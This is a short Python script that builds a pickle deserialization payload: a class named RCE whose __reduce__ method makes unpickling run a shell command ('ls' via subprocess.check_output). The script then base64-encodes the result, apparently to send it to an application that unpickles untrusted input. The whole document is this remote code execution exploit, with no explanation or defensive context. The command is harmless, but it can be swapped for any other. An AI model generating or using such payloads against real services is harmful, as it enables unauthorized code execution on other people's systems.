import pickle
import base64
import subprocess



class RCE:
    def __reduce__(self):
        return (subprocess.check_output,(('ls'),))


serialized = pickle.dumps(RCE())

encode = base64.urlsafe_b64encode(serialized).decode()

print(encode)